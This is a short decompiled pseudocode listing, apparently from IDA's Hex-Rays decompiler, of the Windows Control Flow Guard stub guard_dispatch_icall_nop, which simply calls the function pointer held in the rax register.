__int64 __fastcall guard_dispatch_icall_nop()
{
  __int64 (*v0)(void); // rax

  return v0();
}


